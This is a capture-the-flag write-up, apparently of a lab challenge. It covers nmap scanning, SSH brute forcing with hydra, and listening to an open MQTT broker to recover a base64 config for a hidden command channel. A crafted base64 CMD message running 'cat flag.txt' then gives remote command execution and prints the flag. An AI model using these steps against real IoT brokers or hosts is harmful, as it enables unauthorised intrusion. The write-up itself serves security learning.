First, ran the scan 

```bash 
nmap -A -T4 -p- 10.49.160.232 
```
then it only show port 22 is opened, i both do brute-forcing ssh with 

```bash 
hydra -l john -P /usr/share/wordlists/rockyou.txt <target_ip> ssh 
```
and ran the nmap full port scan again 

```bash 
nmap -sS -p1-65335 10.49.160.232
```

the brute-force didn't work but i found a open `1883` port called mosquitto -> it's `a publish-subscribeb network protocol for the Internet of Things (IoT). Default ports are 1883, 8883 (TLS).`

[POC1](https://github.com/kh4sh3i/MQTT-Pentesting)
[POC2](https://www.exploit-db.com/docs/48096)

ran the command open the broker and listen to all topic 

```bash 
mosquitto_sub -h 10.49.160.232 -p 1883 -t '#' -v
kitchen/toaster {"id":12298992569030501446,"in_use":true,"temperature":149.86162,"toast_time":285}
livingroom/speaker {"id":17005962446824343976,"gain":45}
storage/thermostat {"id":17861149194110261264,"temperature":24.293638}
patio/lights {"id":16900603513373834002,"color":"PURPLE","status":"OFF"}
storage/thermostat {"id":1305957373357964601,"temperature":24.301067}
livingroom/speaker {"id":9077451000216496622,"gain":55}
kitchen/toaster {"id":3994355962708803985,"in_use":false,"temperature":158.72498,"toast_time":349}
storage/thermostat {"id":2619950991716559919,"temperature":23.96426}
frontdeck/camera {"id":17422709444603610757,"yaxis":28.340729,"xaxis":133.91382,"zoom":3.8263993,"movement":false}
patio/lights {"id":17520266023547316939,"color":"GREEN","status":"OFF"}
livingroom/speaker {"id":3786544343675167734,"gain":70}
kitchen/toaster {"id":18419059262980200151,"in_use":true,"temperature":156.03992,"toast_time":355}
storage/thermostat {"id":8793897364636838479,"temperature":23.829391}
livingroom/speaker {"id":14884275746995433179,"gain":61}
patio/lights {"id":14594655284509036000,"color":"BLUE","status":"ON"}
storage/thermostat {"id":16027916419815021747,"temperature":24.075926}
yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
frontdeck/camera {"id":6415593152384641186,"yaxis":33.494553,"xaxis":-104.620834,"zoom":2.8040276,"movement":false}
kitchen/toaster {"id":4806415417024829215,"in_use":false,"temperature":149.62227,"toast_time":235}
livingroom/speaker {"id":11737164211891561169,"gain":51}
storage/thermostat {"id":16566575520814885442,"temperature":23.296656}
patio/lights {"id":12364318554082705143,"color":"BLUE","status":"OFF"}
```

decode the base64 
```bash 
echo -n eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ== | base64 -d 
```

and we have `{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","registered_commands":["HELP","CMD","SYS"],"pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub","sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"}` that have sub topic allow pub to run `HELP`, `CMD` or `SYS`

we ran to start listening for command 
```bash 
mosquitto_sub -h 10.49.160.232 -p 1883 -t "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub" -v
```
and then cat out the result 

```bash 
mosquitto_pub -h 10.49.160.232 -p 1883 -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m "eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsImNtZCI6IkNNRCIsImFyZyI6ImNhdCBmbGFnLnR4dCJ9"

{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag{18d44fc0707ac8dc8be45bb83db54013}\n"}                                                                                                                    
```
and we have 
**FLAG:** `flag{18d44fc0707ac8dc8be45bb83db54013}`
